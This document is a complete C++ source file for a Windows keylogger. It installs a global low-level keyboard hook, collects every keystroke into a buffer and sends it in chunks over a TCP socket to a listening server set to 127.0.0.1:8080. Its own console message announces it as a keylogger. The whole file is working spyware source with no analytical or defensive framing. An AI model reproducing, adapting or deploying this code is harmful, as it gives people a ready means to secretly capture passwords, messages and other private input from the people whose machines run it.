#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <fstream>
#include <string>

// Link against the WinSock library
#pragma comment(lib, "Ws2_32.lib")

// Declare the hook handle
HHOOK hHook = NULL;
SOCKET clientSocket; // Socket for networking
std::string buffer;  // Buffer to hold logged keystrokes

// Hook procedure for capturing keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) { // Process only if it's a keyboard event
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) { // Key is pressed
            DWORD vkCode = pKeyboard->vkCode;

            // Append the key to the buffer
            if (vkCode == VK_RETURN)
                buffer += "[ENTER]";
            else if (vkCode == VK_BACK)
                buffer += "[BACKSPACE]";
            else if (vkCode == VK_TAB)
                buffer += "[TAB]";
            else
                buffer += static_cast<char>(vkCode);

            // Send the buffer when it reaches a threshold
            if (buffer.length() >= 10) { // Adjust threshold as needed
                send(clientSocket, buffer.c_str(), buffer.length(), 0);
                buffer.clear(); // Clear the buffer after sending
            }
        }
    }

    // Pass the event to the next hook in the chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Initialize WinSock and connect to the server
bool InitializeNetworking() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed! Error: " << WSAGetLastError() << std::endl;
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed! Error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080); // Match the server port
    serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1"); // Match the server IP

    if (connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Connection to server failed! Error: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    std::cout << "Connected to server!" << std::endl;
    return true;
}

// Set up the hook
bool SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    if (hHook == NULL) {
        std::cerr << "Failed to install hook! Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

// Remove the hook
void RemoveHook() {
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
    }
}

int main() {
    // Initialize networking
    if (!InitializeNetworking()) {
        return -1;
    }

    // Set the keyboard hook
    if (!SetHook()) {
        closesocket(clientSocket);
        WSACleanup();
        return -1;
    }

    std::cout << "Keylogger started. Logging keys and sending to server...\n";

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    RemoveHook();
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
